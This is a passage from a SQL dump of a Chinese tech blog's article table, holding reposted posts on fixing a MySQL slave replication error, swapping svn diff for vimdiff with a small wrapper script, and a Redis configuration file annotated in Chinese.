border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: rgb(249, 242, 244);">SHOW VARIABLES LIKE &#39;server_id&#39;</code>&nbsp;on both servers. If the value is zero or one, check the configuration file for an explicit setting, because zero or one is often the default value when nothing is specified. I have seen this cause the slave to fail, even in cases where the master’s ID is 1, which ought to work okay but sometimes doesn’t.</p></li><li><p>Finally, make sure your master and slave have different server IDs (on small networks, I usually set the server ID to the last octet in the server’s IP address, because it’s handy and easy to remember). MySQL slaves will refuse to replicate from a master with the same ID.</p></li></ul><p style="box-sizing: border-box; margin-top: 0px; margin-bottom: 20px; color: rgb(44, 62, 80); font-family: &#39;Open Sans&#39;, sans-serif; line-height: 27px; white-space: normal; background-color: rgb(254, 255, 255);">You should now be able to run&nbsp;<a href="http://dev.mysql.com/doc/en/start-slave.html" style="box-sizing: border-box; color: rgb(91, 98, 104);">START SLAVE</a>&nbsp;and start your slave replicating from the master.</p><p style="box-sizing: border-box; margin-top: 0px; margin-bottom: 20px; color: rgb(44, 62, 80); font-family: &#39;Open Sans&#39;, sans-serif; line-height: 27px; white-space: normal; background-color: rgb(254, 255, 255);">Did I miss anything? Let me know, and I’ll add it!</p><p>[原文：http://www.xaprb.com/blog/2007/08/01/why-mysql-server-not-configured-as-slave/]</p>', 'MySQL主从配置好之后，启动从服务器，出现错误："ERROR 1200 (HY000): The server is not configured as slave; fix in config file or with CHANGE MASTER TO"的解决方案。', 'http://agiledev-arsenals.stor.sinaapp.com/cover/296ea29cffcf951edd3f1b24ce7ab7ae.jpg', 'mylxsw', '转载', 1, 0, 1402906705, NULL, NULL, 'html'),
(359, 'Mac更换svn diff为vimdiff', '<p style="margin-top: 0px; margin-bottom: 20px; padding: 0px; border: 0px; outline: 0px; vertical-align: baseline; background-color: rgb(255, 255, 255); color: rgb(68, 68, 68); font-family: Georgia, Times, &#39;Times New Roman&#39;, serif; line-height: 28px; white-space: normal;">可能是被Win下的比较软件给养出的恶习，所以一直很难习惯*nux下文本diff的比较效果，尤其是频繁的使用svn diff。简直会让我对程序的理解能力直线下降。</p><p style="margin-top: 0px; margin-bottom: 20px; padding: 0px; border: 0px; outline: 0px; vertical-align: baseline; background-color: rgb(255, 255, 255); color: rgb(68, 68, 68); font-family: Georgia, Times, &#39;Times New Roman&#39;, serif; line-height: 28px; white-space: normal;">终于发现，其实svn已经提供了这种切换diff程序的机制，在svn的手册里有diffwrap.sh这样一个脚本：<br/></p><pre class="prettyprint" style="margin-top: 0px; margin-bottom: 20px; padding: 5px; border: 1px solid rgb(238, 238, 238); outline: 0px; font-size: 14px; vertical-align: baseline; background-color: rgb(244, 244, 244); font-family: &#39;andale mono&#39;, &#39;lucida console&#39;, monospace; line-height: 1.5; overflow-x: auto; color: rgb(68, 68, 68);"><table class="prettyprint-table" width="802"><tbody style="margin: 0px; padding: 0px; border: 0px; outline: 0px; vertical-align: baseline; background-color: transparent;"><tr style="margin: 0px; padding: 0px; border: 0px; outline: 0px; vertical-align: baseline; background-color: transparent;" class="firstRow"><td class="source" style="margin: 0px; padding: 2px 4px; border: 0px; outline: 0px; vertical-align: middle; background-color: transparent;"><span class="com" style="margin: 0px; padding: 0px; border: 0px; outline: 0px; vertical-align: baseline; background-color: transparent; color: rgb(102, 102, 102); font-style: italic;">#!/bin/sh</span><span class="pln" style="margin: 0px; padding: 0px; border: 0px; outline: 0px; vertical-align: baseline; background-color: transparent; color: rgb(250, 244, 198);"><br/></span></td></tr><tr style="margin: 0px; padding: 0px; border: 0px; outline: 0px; vertical-align: baseline; background-color: transparent;"><td class="source" style="margin: 0px; padding: 2px 4px; border: 0px; outline: 0px; vertical-align: middle; background-color: transparent;"><span class="com" style="margin: 0px; padding: 0px; border: 0px; outline: 0px; vertical-align: baseline; background-color: transparent; color: rgb(102, 102, 102); font-style: italic;"># 配置你喜欢的diff程序路径</span><span class="pln" style="margin: 0px; padding: 0px; border: 0px; outline: 0px; vertical-align: baseline; background-color: transparent; color: rgb(250, 244, 198);"><br/></span></td></tr><tr style="margin: 0px; padding: 0px; border: 0px; outline: 0px; vertical-align: baseline; background-color: transparent;"><td class="source" style="margin: 0px; padding: 2px 4px; border: 0px; outline: 0px; vertical-align: middle; background-color: transparent;"><span class="pln" style="margin: 0px; padding: 0px; border: 0px; outline: 0px; vertical-align: baseline; background-color: transparent; color: rgb(250, 244, 198);">DIFF</span><span class="pun" style="margin: 0px; padding: 0px; border: 0px; outline: 0px; vertical-align: baseline; background-color: transparent; color: rgb(255, 134, 19);">=</span><span class="str" style="margin: 0px; padding: 0px; border: 0px; outline: 0px; vertical-align: baseline; background-color: transparent; color: rgb(177, 214, 49); font-style: italic;">&quot;vimdiff&quot;</span><span class="pln" style="margin: 0px; padding: 0px; border: 0px; outline: 0px; vertical-align: baseline; background-color: transparent; color: rgb(250, 244, 198);"><br/></span></td></tr><tr style="margin: 0px; padding: 0px; border: 0px; outline: 0px; vertical-align: baseline; background-color: transparent;"><td class="source" style="margin: 0px; padding: 2px 4px; border: 0px; outline: 0px; vertical-align: middle; background-color: transparent;"><span class="com" style="margin: 0px; padding: 0px; border: 0px; outline: 0px; vertical-align: baseline; background-color: transparent; color: rgb(102, 102, 102); font-style: italic;"># SVN diff命令会传入两个文件的参数 </span><span class="pln" style="margin: 0px; padding: 0px; border: 0px; outline: 0px; vertical-align: baseline; background-color: transparent; color: rgb(250, 244, 198);"><br/></span></td></tr><tr style="margin: 0px; padding: 0px; border: 0px; outline: 0px; vertical-align: baseline; background-color: transparent;"><td class="source" style="margin: 0px; padding: 2px 4px; border: 0px; outline: 0px; vertical-align: middle; background-color: transparent;"><span class="pln" style="margin: 0px; padding: 0px; border: 0px; outline: 0px; vertical-align: baseline; background-color: transparent; color: rgb(250, 244, 198);">LEFT</span><span class="pun" style="margin: 0px; padding: 0px; border: 0px; outline: 0px; vertical-align: baseline; background-color: transparent; color: rgb(255, 134, 19);">=</span><span class="pln" style="margin: 0px; padding: 0px; border: 0px; outline: 0px; vertical-align: baseline; background-color: transparent; color: rgb(250, 244, 198);">$</span><span class="pun" style="margin: 0px; padding: 0px; border: 0px; outline: 0px; vertical-align: baseline; background-color: transparent; color: rgb(255, 134, 19);">{</span><span class="lit" style="margin: 0px; padding: 0px; border: 0px; outline: 0px; vertical-align: baseline; background-color: transparent; color: rgb(82, 122, 162);">6</span><span class="pun" style="margin: 0px; padding: 0px; border: 0px; outline: 0px; vertical-align: baseline; background-color: transparent; color: rgb(255, 134, 19);">}</span><span class="pln" style="margin: 0px; padding: 0px; border: 0px; outline: 0px; vertical-align: baseline; background-color: transparent; color: rgb(250, 244, 198);"><br/></span></td></tr><tr style="margin: 0px; padding: 0px; border: 0px; outline: 0px; vertical-align: baseline; background-color: transparent;"><td class="source" style="margin: 0px; padding: 2px 4px; border: 0px; outline: 0px; vertical-align: middle; background-color: transparent;"><span class="pln" style="margin: 0px; padding: 0px; border: 0px; outline: 0px; vertical-align: baseline; background-color: transparent; color: rgb(250, 244, 198);">RIGHT</span><span class="pun" style="margin: 0px; padding: 0px; border: 0px; outline: 0px; vertical-align: baseline; background-color: transparent; color: rgb(255, 134, 19);">=</span><span class="pln" style="margin: 0px; padding: 0px; border: 0px; outline: 0px; vertical-align: baseline; background-color: transparent; color: rgb(250, 244, 198);">$</span><span class="pun" style="margin: 0px; padding: 0px; border: 0px; outline: 0px; vertical-align: baseline; background-color: transparent; color: rgb(255, 134, 19);">{</span><span class="lit" style="margin: 0px; padding: 0px; border: 0px; outline: 0px; vertical-align: baseline; background-color: transparent; color: rgb(82, 122, 162);">7</span><span class="pun" style="margin: 0px; padding: 0px; border: 0px; outline: 0px; vertical-align: baseline; background-color: transparent; color: rgb(255, 134, 19);">}</span><span class="pln" style="margin: 0px; padding: 0px; border: 0px; outline: 0px; vertical-align: baseline; background-color: transparent; color: rgb(250, 244, 198);"><br/></span></td></tr><tr style="margin: 0px; padding: 0px; border: 0px; outline: 0px; vertical-align: baseline; background-color: transparent;"><td class="source" style="margin: 0px; padding: 2px 4px; border: 0px; outline: 0px; vertical-align: middle; background-color: transparent;"><span class="com" style="margin: 0px; padding: 0px; border: 0px; outline: 0px; vertical-align: baseline; background-color: transparent; color: rgb(102, 102, 102); font-style: italic;"># 拼接成diff命令所需要的命令格式</span><span class="pln" style="margin: 0px; padding: 0px; border: 0px; outline: 0px; vertical-align: baseline; background-color: transparent; color: rgb(250, 244, 198);"><br/></span></td></tr><tr style="margin: 0px; padding: 0px; border: 0px; outline: 0px; vertical-align: baseline; background-color: transparent;"><td class="source" style="margin: 0px; padding: 2px 4px; border: 0px; outline: 0px; vertical-align: middle; background-color: transparent;"><span class="pln" style="margin: 0px; padding: 0px; border: 0px; outline: 0px; vertical-align: baseline; background-color: transparent; color: rgb(250, 244, 198);">$DIFF $LEFT $RIGHT</span></td></tr></tbody></table></pre><p style="margin-top: 0px; margin-bottom: 20px; padding: 0px; border: 0px; outline: 0px; vertical-align: baseline; background-color: rgb(255, 255, 255); color: rgb(68, 68, 68); font-family: Georgia, Times, &#39;Times New Roman&#39;, serif; line-height: 28px; white-space: normal;"><br/></p><p style="margin-top: 0px; margin-bottom: 20px; padding: 0px; border: 0px; outline: 0px; vertical-align: baseline; background-color: rgb(255, 255, 255); color: rgb(68, 68, 68); font-family: Georgia, Times, &#39;Times New Roman&#39;, serif; line-height: 28px; white-space: normal;">把这个文件改名为svndiff，放在/usr/local/bin/目录里，并给执行权限<br/>然后修改~/.subversion/config文件，将其中<br/></p><pre class="prettyprint" style="margin-top: 0px; margin-bottom: 20px; padding: 5px; border: 1px solid rgb(238, 238, 238); outline: 0px; font-size: 14px; vertical-align: baseline; background-color: rgb(244, 244, 244); font-family: &#39;andale mono&#39;, &#39;lucida console&#39;, monospace; line-height: 1.5; overflow-x: auto; color: rgb(68, 68, 68);">#&nbsp;diff-cmd&nbsp;=&nbsp;diff_program&nbsp;(diff,&nbsp;gdiff,&nbsp;etc.)</pre><p><br style="color: rgb(68, 68, 68); font-family: Georgia, Times, &#39;Times New Roman&#39;, serif; line-height: 28px; white-space: normal; background-color: rgb(255, 255, 255);"/><span style="color: rgb(68, 68, 68); font-family: Georgia, Times, &#39;Times New Roman&#39;, serif; line-height: 28px; background-color: rgb(255, 255, 255);">修改成</span><br style="color: rgb(68, 68, 68); font-family: Georgia, Times, &#39;Times New Roman&#39;, serif; line-height: 28px; white-space: normal; background-color: rgb(255, 255, 255);"/></p><pre class="prettyprint" style="margin-top: 0px; margin-bottom: 20px; padding: 5px; border: 1px solid rgb(238, 238, 238); outline: 0px; font-size: 14px; vertical-align: baseline; background-color: rgb(244, 244, 244); font-family: &#39;andale mono&#39;, &#39;lucida console&#39;, monospace; line-height: 1.5; overflow-x: auto; color: rgb(68, 68, 68);">diff-cmd&nbsp;=&nbsp;/usr/local/bin/svndiff</pre><p style="margin-top: 0px; margin-bottom: 20px; padding: 0px; border: 0px; outline: 0px; vertical-align: baseline; background-color: rgb(255, 255, 255); color: rgb(68, 68, 68); font-family: Georgia, Times, &#39;Times New Roman&#39;, serif; line-height: 28px; white-space: normal;">现实效果如下：</p><p style="margin-top: 0px; margin-bottom: 20px; padding: 0px; border: 0px; outline: 0px; vertical-align: baseline; background-color: rgb(255, 255, 255); color: rgb(68, 68, 68); font-family: Georgia, Times, &#39;Times New Roman&#39;, serif; line-height: 28px; white-space: normal;"><a href="http://www.ccvita.com/usr/uploads/2011/svn_diff.png" target="_blank" style="margin: 0px; padding: 0px; border: 0px; outline: 0px; vertical-align: baseline; background-color: transparent; color: rgb(51, 84, 170); text-decoration: none;"><img src="http://www.ccvita.com/usr/uploads/2011/svn_diff_s.png" alt="" style="margin: 5px auto; padding: 0px; border: 0px; outline: 0px; vertical-align: baseline; background-color: transparent; max-width: 600px; display: block; -webkit-box-shadow: rgb(0, 0, 0) 10px 10px 20px; box-shadow: rgb(0, 0, 0) 10px 10px 20px;"/></a></p><p><br/></p><p><br/></p><p>[转载自 http://www.ccvita.com/445.html]</p>', '可能是被Win下的比较软件给养出的恶习，所以一直很难习惯*nux下文本diff的比较效果，尤其是频繁的使用svn diff。简直会让我对程序的理解能力直线下降。', 'http://agiledev-arsenals.stor.sinaapp.com/cover/6078c895f95a3d8008aebdb4a88519c8.jpg', 'mylxsw', '转载', 1, 0, 1403511221, NULL, NULL, 'html');
INSERT INTO `ar_article` (`id`, `title`, `content`, `intro`, `feature_img`, `author`, `source`, `isvalid`, `creator`, `publish_date`, `update_date`, `updator`, `model`) VALUES
(360, 'Redis配置文件', '<p># Redis configuration file example</p><p># Note on units: when memory size is needed, it is possible to specify</p><p># it in the usual form of 1k 5GB 4M and so forth:</p><p>#</p><p># 1k =&gt; 1000 bytes</p><p># 1kb =&gt; 1024 bytes</p><p># 1m =&gt; 1000000 bytes</p><p># 1mb =&gt; 1024*1024 bytes</p><p># 1g =&gt; 1000000000 bytes</p><p># 1gb =&gt; 1024*1024*1024 bytes</p><p>#</p><p># units are case insensitive so 1GB 1Gb 1gB are all the same.</p><p>################################## INCLUDES ###################################</p><p># 包含一个或多个其它配置文件，如果你有一个标准的模板让所有的redis服务器使用，但是仍然需要对每一个服务器进行自定义的配置，这将是非常有用的。</p><p># Include one or more other config files here. &nbsp;This is useful if you</p><p># have a standard template that goes to all Redis server but also need</p><p># to customize a few per-server settings. &nbsp;Include files can include</p><p># other files, so use this wisely.</p><p>#</p><p># 注意选项“option”不会被admin或者是redis sentinel(哨兵)命令“CONFIG REWRITE”重写，Redis总是会使用配置指令的最后出现的一行为准，因此，你最好把include指令放在这个文件的开始处，以避免运行时配置文件修改被重写。</p><p># Notice option &quot;include&quot; won&#39;t be rewritten by command &quot;CONFIG REWRITE&quot;</p><p># from admin or Redis Sentinel. Since Redis always uses the last processed</p><p># line as value of a configuration directive, you&#39;d better put includes</p><p># at the beginning of this file to avoid overwriting config change at runtime.</p><p>#</p><p># 反之，如果你对使用include指令重写配置选项感兴趣，那最好将include放在最后一行</p><p># If instead you are interested in using includes to override configuration</p><p># options, it is better to use include as the last line.</p><p>#</p><p># include /path/to/local.conf</p><p># include /path/to/other.conf</p><p>################################ GENERAL &nbsp;#####################################</p><p># 默认情况下，redis并不会以后台进程的形式运行，将该选项配置为yes可以使用后台进程形式运行，注意，当使用后台进程模式运行的时候，redis将会写入一个/var/run/redis.pid的文件</p><p># By default Redis does not run as a daemon. Use &#39;yes&#39; if you need it.</p><p># Note that Redis will write a pid file in /var/run/redis.pid when daemonized.</p><p>daemonize yes</p><p># 当运行为后台模式的时候，指定写入的pid文件的路径，默认位置为/var/run/redis.pid</p><p># When running daemonized, Redis writes a pid file in /var/run/redis.pid by</p><p># default. You can specify a custom pid file location here.</p><p>pidfile /var/run/redis/redis-server.pid</p><p># 默认监听端口为6379,如果指定端口号为0,redis将不会监听TCP socket</p><p># Accept connections on the specified port, default is 6379.</p><p># If port 0 is specified Redis will not listen on a TCP socket.</p><p>port 6379</p><p># 默认情况下redis监听连接的网络接口地址，如果同时监听多个网卡接口的话，使用空格分割多个网络地址</p><p># By default Redis listens for connections from all the network interfaces</p><p># available on the server. It is possible to listen to just one or multiple</p><p># interfaces using the &quot;bind&quot; configuration directive, followed by one or</p><p># more IP addresses.</p><p>#</p><p># Examples:</p><p>#</p><p># bind 192.168.1.100 10.0.0.1</p><p>bind 127.0.0.1</p><p># 指定用来监听连接请求的unix socket的路径，这个项没有默认值，所以，如果没有指定的话，将不会监听任何unix socket</p><p># Specify the path for the unix socket that will be used to listen for</p><p># incoming connections. There is no default, so Redis will not listen</p><p># on a unix socket when not specified.</p><p>#</p><p># unixsocket /var/run/redis/redis.sock</p><p># unixsocketperm 755</p><p># 客户端空闲超时时间，单位为秒，如果为0,则不超时</p><p># Close the connection after a client is idle for N seconds (0 to disable)</p><p>timeout 0</p><p># TCP保活</p><p># TCP keepalive.</p><p>#</p><p># 如果非0,使用SO_KEEPALIVE来发送TCP ACK给客户端以确认客户端是否在线，这是非常有用的，有两个原因：</p><p># If non-zero, use SO_KEEPALIVE to send TCP ACKs to clients in absence</p><p># of communication. This is useful for two reasons:</p><p>#</p><p># 1) 检测已经挂掉的种子</p><p># 1) Detect dead peers.</p><p># 2) 从网络中间层的角度让连接保持激活</p><p># 2) Take the connection alive from the point of view of network</p><p># &nbsp; &nbsp;equipment in the middle.</p><p>#</p><p># On Linux, the specified value (in seconds) is the period used to send ACKs.</p><p># Note that to close the connection the double of the time is needed.</p><p># On other kernels the period depends on the kernel configuration.</p><p>#</p><p># A reasonable value for this option is 60 seconds.</p><p>tcp-keepalive 0</p><p># Specify the server verbosity level.</p><p># This can be one of:</p><p># debug (a lot of information, useful for development/testing)</p><p># verbose (many rarely useful info, but not a mess like the debug level)</p><p># notice (moderately verbose, what you want in production probably)</p><p># warning (only very important / critical messages are logged)</p><p>loglevel notice</p><p># 指定日志文件名，如果为空字符串的话，将会强制将Redis日志文件写入到标准输出，注意的是，如果使用后台进程模式运行，如果这里为空的话，将会将日志发送到/dev/null</p><p># Specify the log file name. Also the empty string can be used to force</p><p># Redis to log on the standard output. Note that if you use standard</p><p># output for logging but daemonize, logs will be sent to /dev/null</p><p>logfile /var/log/redis/redis-server.log</p><p># 允许将日志写入系统日志，设置syslog-enabled为yes即可。</p><p># 可选的可以更新syslog的参数以适应你的需要</p><p># To enable logging to the system logger, just set &#39;syslog-enabled&#39; to yes,</p><p># and optionally update the other syslog parameters to suit your needs.</p><p># syslog-enabled no</p><p># 指定日志标识</p><p># Specify the syslog identity.</p><p># syslog-ident redis</p><p># 指定syslog设备，必须是USER或者是LOCAL0-LOCAL7</p><p># Specify the syslog facility. Must be USER or between LOCAL0-LOCAL7.</p><p># syslog-facility local0</p><p># 设置数据库的编号，默认数据库是DB 0, 你可以在每个连接上使用SELECT &lt;DBID&gt; 选择使用哪个数据库，其中，dbid是0-（数据库数量-1）之一。</p><p># Set the number of databases. The default database is DB 0, you can select</p><p># a different one on a per-connection basis using SELECT &lt;dbid&gt; where</p><p># dbid is a number between 0 and &#39;databases&#39;-1</p><p>databases 16</p><p>################################ SNAPSHOTTING &nbsp;################################</p><p>#</p><p># 保存数据库到磁盘上</p><p># Save the DB on disk:</p><p>#&nbsp;</p><p># &nbsp; save &lt;seconds&gt; &lt;changes&gt;</p><p>#</p><p># &nbsp; Will save the DB if both the given number of seconds and the given</p><p># &nbsp; number of write operations against the DB occurred.</p><p>#</p><p># &nbsp; In the example below the behaviour will be to save:</p><p># &nbsp; after 900 sec (15 min) if at least 1 key changed</p><p># &nbsp; after 300 sec (5 min) if at least 10 keys changed</p><p># &nbsp; after 60 sec if at least 10000 keys changed</p><p>#</p><p># &nbsp; Note: you can disable saving at all commenting all the &quot;save&quot; lines.</p><p>#</p><p># &nbsp; It is also possible to remove all the previously configured save</p><p># &nbsp; points by adding a save directive with a single empty string argument</p><p># &nbsp; like in the following example:</p><p>#</p><p># &nbsp; save &quot;&quot;</p><p>save 900 1</p><p>save 300 10</p><p>save 60 10000</p><p># 默认情况下，如果RDB快照被允许的话（至少一个保存点），同时最后一次后台保存失败的情况下，redis将会停止接受任何的写入请求</p><p># By default Redis will stop accepting writes if RDB snapshots are enabled</p><p># (at least one save point) and the latest background save failed.</p><p># 这样可以让用户知道数据没有持久化到磁盘上，否则的话，将不会有人注意到出现问题，以至于产生更大的危害</p><p># This will make the user aware (in a hard way) that data is not persisting</p><p># on disk properly, otherwise chances are that no one will notice and some</p><p># disaster will happen.</p><p>#</p><p># 如果后台保存进程重新开始工作了，redis将会自动的再次允许写入</p><p># If the background saving process will start working again Redis will</p><p># automatically allow writes again.</p><p>#</p><p># 如果你安装了合适的监控设备监控redis服务器的话，你可以禁止这个特性，这样，redis将会继续正常工作，即使磁盘，权限等等出现问题。</p><p># However if you have setup your proper monitoring of the Redis server</p><p># and persistence, you may want to disable this feature so that Redis will</p><p># continue to work as usual even if there are problems with disk,</p><p># permissions, and so forth.</p><p>stop-writes-on-bgsave-error yes</p><p># 当备份数据库的时候使用LZF算法压缩字符串对象，默认情况下设置为yes，通常情况下是非常有用的。</p><p># 如果你希望在子进程中节省一些CPU运算，设置这个选项为no，但是这样的话，你的数据库文件将会更加庞大一些</p><p># Compress string objects using LZF when dump .rdb databases?</p><p># For default that&#39;s set to &#39;yes&#39; as it&#39;s almost always a win.</p><p># If you want to save some CPU in the saving child set it to &#39;no&#39; but</p><p># the dataset will likely be bigger if you have compressible values or keys.</p><p>rdbcompression yes</p><p># 从RDB 5之后，在文件的末尾追加了一个CRC64的校验值</p><p># 这使得RDB文件格式更加稳定，但是在保存或者是载入RDB文件的时候，却产生一定的性能影响（大约10%）,所以，你可以禁止这个特性以获取最佳性能</p><p># Since version 5 of RDB a CRC64 checksum is placed at the end of the file.</p><p># This makes the format more resistant to corruption but there is a performance</p><p># hit to pay (around 10%) when saving and loading RDB files, so you can disable it</p><p># for maximum performances.</p><p>#</p><p># RDB files created with checksum disabled have a checksum of zero that will</p><p># tell the loading code to skip the check.</p><p>rdbchecksum yes</p><p># The filename where to dump the DB</p><p># 导出的DB文件名</p><p>dbfilename dump.rdb</p><p># The working directory.</p><p>#</p><p># Redis的工作目录</p><p># DB将会被写入到这个目录中，文件名使用dbfilename指令指定的文件名</p><p># The DB will be written inside this directory, with the filename specified</p><p># above using the &#39;dbfilename&#39; configuration directive.</p><p>#&nbsp;</p><p># 追加文件也将会在这个目录中创建</p><p># The Append Only File will also be created inside this directory.</p><p>#&nbsp;</p><p># 注意的是，这里必须指定为一个目录，不能是文件名</p><p># Note that you must specify a directory here, not a file name.</p><p>dir /var/lib/redis</p><p>################################# REPLICATION #################################</p><p># 主从复制。使用slaveof使redis实例一个另一个redis服务器的拷贝，注意，这些配置是针对从库的，所以，可以配置从库以不同的周期去保存DB，或者是监听另一个端口等等</p><p># Master-Slave replication. Use slaveof to make a Redis instance a copy of</p><p># another Redis server. Note that the configuration is local to the slave</p><p># so for example it is possible to configure the slave to save the DB with a</p><p># different interval, or to listen to another port, and so on.</p><p>#</p><p># slaveof &lt;masterip&gt; &lt;masterport&gt;</p><p># 如果主库是使用密码保护的（使用requirepass配置指令)，需要告诉从库在开始同步进程复制之前先进行认证授权，否则主库将会拒绝从库的请求。</p><p># If the master is password protected (using the &quot;requirepass&quot; configuration</p><p># directive below) it is possible to tell the slave to authenticate before</p><p># starting the replication synchronization process, otherwise the master will</p><p># refuse the slave request.</p><p>#</p><p># masterauth &lt;master-password&gt;</p><p># 当从库丢失了与主库的连接，或者是当复制过程仍然在继续，从库将以下面两种不同的方法处理：</p><p># When a slave loses its connection with the master, or when the replication</p><p># is still in progress, the slave can act in two different ways:</p><p>#</p><p># 1) 如果slave-serve-stale-data 设置为yes（默认值），从库将仍然响应客户端请求，可能提供的是已经过期的数据或者如果这是第一次同步的话，将会是一个空的结果集</p><p># 1) if slave-serve-stale-data is set to &#39;yes&#39; (the default) the slave will</p><p># &nbsp; &nbsp;still reply to client requests, possibly with out of date data, or the</p><p># &nbsp; &nbsp;data set may just be empty if this is the first synchronization.</p><p>#</p><p># 2) 如果slabe-serve-stale-data设置为no的话，从库将会返回一个错误&quot;SYNC with master in progress&quot;给所有的命令，INFO和SLAVEOF除外</p><p># 2) if slave-serve-stale-data is set to &#39;no&#39; the slave will reply with</p><p># &nbsp; &nbsp;an error &quot;SYNC with master in progress&quot; to all the kind of commands</p><p># &nbsp; &nbsp;but to INFO and SLAVEOF.</p><p>#</p><p>slave-serve-stale-data yes</p><p># 可以配置从库实例是否接受写入请求，可以通过从库实例写入一些临时数据（因为写入从库的数据将会在发生同步之后被擦除），但是也可能会因为客户端错误的配置而产生问题</p><p># You can configure a slave instance to accept writes or not. Writing against</p><p># a slave instance may be useful to store some ephemeral data (because data</p><p># written on a slave will be easily deleted after resync with the master) but</p><p># may also cause problems if clients are writing to it because of a</p><p># misconfiguration.</p><p>#</p><p># 从Redis 2.6开始，默认情况下，从库是只读的</p><p># Since Redis 2.6 by default slaves are read-only.</p><p>#</p><p># 注意： 只读的从库不是设计用来暴漏给网络上不受信任的客户端的，它只是一个保护层，用于防止错误的使用数据库实例。只读的从库中，管理命令如CONFIG，DEBUG等等仍然是可用的。你可以通过给只读从库中使用rename-command命令隐藏所有的管理命令或者是危险的命令，以却提高安全性</p><p># Note: read only slaves are not designed to be exposed to untrusted clients</p><p># on the internet. It&#39;s just a protection layer against misuse of the instance.</p><p># Still a read only slave exports by default all the administrative commands</p><p># such as CONFIG, DEBUG, and so forth. To a limited extent you can improve</p><p># security of read only slaves using &#39;rename-command&#39; to shadow all the</p><p># administrative / dangerous commands.</p><p>slave-read-only yes</p><p># 从库发送给服务器PING的预定时间间隔。默认值是10秒</p><p># Slaves send PINGs to server in a predefined interval. It&#39;s possible to change</p><p># this interval with the repl_ping_slave_period option. The default value is 10</p><p># seconds.</p><p>#</p><p># repl-ping-slave-period 10</p><p># 下面的选项设置了复制超时时间：</p><p># The following option sets the replication timeout for:</p><p>#</p><p># 1) 从从库的角度看SYNC期间I/O传输的容量`</p><p># 1) Bulk transfer I/O during SYNC, from the point of view of slave.</p><p># 2) 从从库的角度（数据，ping）看，主库的超时时间</p><p># 2) Master timeout from the point of view of slaves (data, pings).</p><p># 3) 从主库的观点看，从库的超时时间</p><p># 3) Slave timeout from the point of view of masters (REPLCONF ACK pings).</p><p>#</p><p># 注意的是，一定要保证这个值比前面配置的repl-ping-slave-period更大，否则在每次主库和从库之间出现慢速响应的话都会检测出来超时</p><p># It is important to make sure that this value is greater than the value</p><p># specified for repl-ping-slave-period otherwise a timeout will be detected</p><p># every time there is low traffic between the master and the slave.</p><p>#</p><p># repl-timeout 60</p><p># Disable TCP_NODELAY on the slave socket after SYNC?</p><p># 在SYNC之后在从库的socket上禁止TCP_DELAY</p><p>#</p><p># 如果设置为yes，Redis将会使用更小的TCP包和更小的带宽发送数据到从库，但是这可能正佳数据在从库出现的延迟时间</p><p># If you select &quot;yes&quot; Redis will use a smaller number of TCP packets and</p><p># less bandwidth to send data to slaves. But this can add a delay for</p><p># the data to appear on the slave side, up to 40 milliseconds with</p><p># Linux kernels using a default configuration.</p><p>#</p><p># 如果设置为no，从库中出现数据将会减少延迟时间，但是会占用更多的带宽</p><p># If you select &quot;no&quot; the delay for data to appear on the slave side will</p><p># be reduced but more bandwidth will be used for replication.</p><p>#</p><p># 默认情况下，我们已经优化减少了等待时间，但是在非常高负载的情况下，或者是当主从之间经过很多跳的话，将该选项设置为yes将会是个好主意</p><p># By default we optimize for low latency, but in very high traffic conditions</p><p># or when the master and slaves are many hops away, turning this to &quot;yes&quot; may</p><p># be a good idea.</p><p>repl-disable-tcp-nodelay no</p><p># 设置复制备份日志大小。备份日志是一个积累了在从库断开链接的时候的缓冲数据的文件，当从库想要重新连接的时候，通常不需要完全重新同步，只需要同步部分数据就足够了，只需要传递当失去连接的时候从库丢失的那部分数据</p><p># Set the replication backlog size. The backlog is a buffer that accumulates</p><p># slave data when slaves are disconnected for some time, so that when a slave</p><p># wants to reconnect again, often a full resync is not needed, but a partial</p><p># resync is enough, just passing the portion of data the slave missed while</p><p># disconnected.</p><p>#</p><p># 备份日志文件越大，从库断开连接的时间就可以越长，在之后可以来一个局部的重新同步</p><p># The biggest the replication backlog, the longer the time the slave can be</p><p># disconnected and later be able to perform a partial resynchronization.</p><p>#</p><p># 备份日志只在至少有一个从库连接的时候才会创建</p><p># The backlog is only allocated once there is at least a slave connected.</p><p>#</p><p># repl-backlog-size 1mb</p><p># 在主库与从库在一段时间内都没有连接过的时候，备份日志将会被释放。下面的配置项配置了备份日志的有效期</p><p># After a master has no longer connected slaves for some time, the backlog</p><p># will be freed. The following option configures the amount of seconds that</p><p># need to elapse, starting from the time the last slave disconnected, for</p><p># the backlog buffer to be freed.</p><p>#</p><p># A value of 0 means to never release the backlog.</p><p># 如果为0的话，则永久有效</p><p>#</p><p># repl-backlog-ttl 3600</p><p># 从库的优先级是一个整数，Redis将会将该值输出到INFO输出中。通常Redis哨兵使用这个来选择在主库不能够正常工作的情况下，将哪个从库提升为主库</p><p># The slave priority is an integer number published by Redis in the INFO output.</p><p># It is used by Redis Sentinel in order to select a slave to promote into a</p><p># master if the master is no longer working correctly.</p><p>#</p><p># 优先级数值比较低的会被认为作为提升主库的最佳选择，所以，如果有三个从库，优先级分别为10,100,25,哨兵将会选择优先级为10的作为主库</p><p># A slave with a low priority number is considered better for promotion, so</p><p># for instance if there are three slaves with priority 10, 100, 25 Sentinel will</p><p># pick the one with priority 10, that is the lowest.</p><p>#</p><p># However a special priority of 0 marks the slave as not able to perform the</p><p># role of master, so a slave with priority of 0 will never be selected by</p><p># Redis Sentinel for promotion.</p><p>#</p><p># By default the priority is 100.</p><p>slave-priority 100</p><p># 在有N个从库连接，但是在小于等于M秒时间内落后与主库的话，可以设置主库停止接受写入请求</p><p># It is possible for a master to stop accepting writes if there are less than</p><p># N slaves connected, having a lag less or equal than M seconds.</p><p>#</p><p># 这N个从库需要是online状态的</p><p># The N slaves need to be in &quot;online&quot; state.</p><p>#</p><p># 落后的秒数，必须是&lt;= 指定的值，通过从从库最后的ping的时间计算，通常这个ping是每秒都会发送一次的</p><p># The lag in seconds, that must be &lt;= the specified value, is calculated from</p><p># the last ping received from the slave, that is usually sent every second.</p><p>#</p><p># This option does not GUARANTEES that N replicas will accept the write, but</p><p># will limit the window of exposure for lost writes in case not enough slaves</p><p># are available, to the specified number of seconds.</p><p>#</p><p># For example to require at least 3 slaves with a lag &lt;= 10 seconds use:</p><p>#</p><p># min-slaves-to-write 3</p><p># min-slaves-max-lag 10</p><p>#</p><p># Setting one or the other to 0 disables the feature.</p><p>#</p><p># By default min-slaves-to-write is set to 0 (feature disabled) 